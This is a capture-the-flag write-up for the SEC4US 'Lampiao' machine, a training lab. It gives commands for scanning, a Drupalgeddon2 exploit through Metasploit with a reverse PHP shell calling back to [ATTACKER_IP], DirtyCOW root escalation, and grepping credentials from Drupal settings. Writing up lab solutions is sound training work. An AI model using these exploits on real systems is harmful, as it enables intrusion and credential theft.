# Maq157: Lampiao

Writeup for the **Lampiao** challenge on [SEC4US](https://sec4us.com.br/).

> **Category:** Hacking: Easy
> **Difficulty:** Easy
> **Points:** 157

---

## Overview

Named after the famous Brazilian bandit, this machine runs a vulnerable Drupal installation and a kernel susceptible to local privilege escalation. A classic web-to-root path.

## Reconnaissance

```bash
nmap -sV -sC -p- [TARGET_IP] -oN nmap_scan.txt
```

Look for HTTP (80 or 1898), SSH (22). If Drupal is found, identify the version:

```bash
curl http://[TARGET_IP]:1898/CHANGELOG.txt | head -5
droopescan scan drupal -u http://[TARGET_IP]:1898
```

## Exploitation

**Drupalgeddon2 (CVE-2018-7600):**

```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS [TARGET_IP]
set RPORT 1898
set PAYLOAD php/reverse_php
set LHOST [ATTACKER_IP]
run
```

**Manual exploitation:**

```bash
python3 drupalgeddon2.py http://[TARGET_IP]:1898/
```

This yields a web shell or reverse shell as the `www-data` user.

## Privilege Escalation

Check the kernel version for DirtyCOW (CVE-2016-5195):

```bash
uname -a
# If kernel < 4.8.3, DirtyCOW is likely viable
```

Compile and run the exploit:

```bash
gcc -pthread dirty.c -o dirty -lcrypt
./dirty [NEW_PASSWORD]
su firefart
```

Alternatively, check for credentials in Drupal configuration:

```bash
cat /var/www/html/sites/default/settings.php | grep -i pass
```

## Security Framework Mapping

### MITRE ATT&CK

| Technique | ID |
|-----------|----|
| Exploit Public-Facing Application | T1190 |
| Exploitation for Privilege Escalation | T1068 |
| Unsecured Credentials: Credentials in Files | T1552.001 |

### CWE

- **CWE-94:** Improper Control of Generation of Code (Drupalgeddon2)
- **CWE-362:** Concurrent Execution Using Shared Resource with Improper Synchronization (DirtyCOW)

---

Like the bandit who roamed the Brazilian sertao, this machine tests whether you can find the weak spot in its armor. The web lets you in; the kernel lets you own it.

```
(❍ᴥ❍ʋ)
```

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
